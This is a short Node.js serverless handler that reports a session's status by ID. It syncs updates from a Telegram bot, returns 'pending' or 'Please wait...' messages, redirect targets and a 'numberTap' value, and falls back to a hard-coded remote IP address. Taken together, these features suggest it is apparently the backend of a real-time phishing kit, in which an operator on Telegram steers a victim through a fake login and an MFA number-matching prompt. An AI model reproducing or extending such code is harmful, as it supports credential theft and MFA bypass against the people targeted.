const http = require('http');
const { loadConfig, getSession, syncTelegramUpdates } = require('./_store');

module.exports = async (req, res) => {
  res.setHeader('Content-Type', 'application/json');
  res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate');

  const sessionId = req.query.sessionId || req.query.id;
  if (!sessionId) {
    return res.status(400).json({ error: 'Missing sessionId parameter' });
  }

  const config = loadConfig();
  if (config.telegram_bot_token) {
    try {
      await syncTelegramUpdates(config.telegram_bot_token);
    } catch (e) {}
  }

  const session = getSession(sessionId);
  if (session) {
    const resp = {
      sessionId,
      status: session.status || 'pending',
      message: session.message || 'Please wait...'
    };
    if (session.redirect) resp.redirect = session.redirect;
    if (session.numberTap) resp.numberTap = session.numberTap;
    return res.status(200).json(resp);
  }

  // Fallback to external API
  try {
    const extData = await new Promise((resolve, reject) => {
      const extReq = http.get(`http://157.180.52.45:5040/api/status/${sessionId}`, { timeout: 3000 }, (resp) => {
        let b = '';
        resp.on('data', c => b += c);
        resp.on('end', () => resolve(JSON.parse(b)));
      });
      extReq.on('error', reject);
      extReq.on('timeout', () => { extReq.destroy(); reject(new Error('timeout')); });
    });
    if (extData) return res.status(200).json(extData);
  } catch (e) {}

  return res.status(404).json({ error: 'Session not found or expired' });
};
